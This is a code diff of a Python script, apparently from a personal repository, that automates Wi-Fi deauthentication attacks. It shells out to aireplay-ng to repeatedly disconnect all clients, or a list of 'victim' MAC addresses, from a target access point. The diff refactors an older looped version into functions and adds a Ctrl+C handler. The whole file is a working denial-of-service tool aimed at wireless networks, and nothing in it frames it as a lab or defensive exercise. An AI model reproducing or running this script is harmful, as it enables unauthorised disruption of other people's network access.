@@ -1,49 +1,49 @@
 #! /usr/bin/env python
-
 import subprocess
+import signal
+import sys
 
-#Network with various known associated stations:
-#network = '00:00:00:00:00:00'
-#victims = ['00:00:00:00:00:11' , '00:00:00:00:00:22', '00:00:00:00:00:33', '00:00:00:00:00:44', '00:00:00:00:00:55']
+#Deauthenticate all clients (You should use aircrack-ng directly):
+network   = "00:00:00:00:00:00"
+victims   = []
 
-#Network without any known associated station:
-network = '00:00:00:00:00:00'
-victims = []
+#Deauthenticate these specific clients:
+#network = "00:00:00:00:00:00"
+#victims = [
+#    "00:00:00:00:00:11", #Client 01
+#    "00:00:00:00:00:22", #Client 02
+#    "00:00:00:00:00:33", #Client 03
+#    "00:00:00:00:00:44", #Client 04
+#    "00:00:00:00:00:55"] #Client 05
 
+interface = "wlan1mon"
 
-#Welcome Message
-print
-print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"] " +chr(27)+"[1;34m"+"WELCOME TO THE WI-FI DEAUTHENTICATION SCRIPT"
-print chr(27)+"[0m"
-victimsCont = 0
+def signal_handler(signal, frame):
+        print('You pressed Ctrl+C!')
+        sys.exit(0)
 
-print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"] " +chr(27)+"[1;34m"+"Victim Network:"
-print chr(27)+"[0m" + "       - " + network
-print
+def deauth_all_clients(net):
+    command = "aireplay-ng --deauth 0 -a {0} {1}".format(net, interface)
+    print "[+] Deauthenticating all clients in the network"
+    print "[!] You may as well run aireplay-ng directly: [{0}]\n".format(command)
+    subprocess.call([command], shell=True) #Runs forever
 
-print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"] " +chr(27)+"[1;34m"+"Victim stations:"
-while victimsCont < len(victims):
-    print chr(27)+"[0m" + "       - " + victims[victimsCont]
-    victimsCont = victimsCont + 1
-print
-victimsCont = 0
+def deauth_client(net, cli):
+    print "\n[+] Deauthenticating {0}\n".format(cli)
+    command = "aireplay-ng --deauth 3 -a {0} -c {1} {2}".format(net, cli, interface)
+    subprocess.call([command], shell=True)
 
-#DoS without specifying victims (Here, using aireplay-ng in spite of this script should be more efficient):
-if len(victims) == 0:
-    while 1:
-        command = "aireplay-ng -a " + network + " -0 5 mon0"
-        print
-        print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"]" +chr(27)+"[0;34m"+" Deauthenticating any client in the network " + network
-        print chr(27)+"[0m"
-        subprocess.call([command], shell = True)
+if __name__ == '__main__':
+    signal.signal(signal.SIGINT, signal_handler)
+    print "[+] Target Network:\n\t{0}".format(network)
 
-#DoS especificying victims:
-while 1:
-    command = "aireplay-ng -a " + network + " -c " + victims[victimsCont] + " -0 3 mon0"
-    print
-    print chr(27)+"[1;31m"+"[" + chr(27)+"[0m"+"+" + chr(27)+"[1;31m"+"]" +chr(27)+"[0;34m"+" Deauthenticating " + victims[victimsCont]
-    print chr(27)+"[0m"
-    subprocess.call([command], shell = True)
-    victimsCont = victimsCont + 1
-    if victimsCont >= len(victims):
-        victimsCont = 0
+    if len(victims) == 0:
+        deauth_all_clients(network) #Will only return if there's an error
+        sys.exit(1)
+
+    print "[+] Target Clients:"
+    for i in range(0, len(victims)):
+        print "\t{0}".format(victims[i])
+    while True:
+        for i in range(0, len(victims)):
+            deauth_client(network, victims[i])
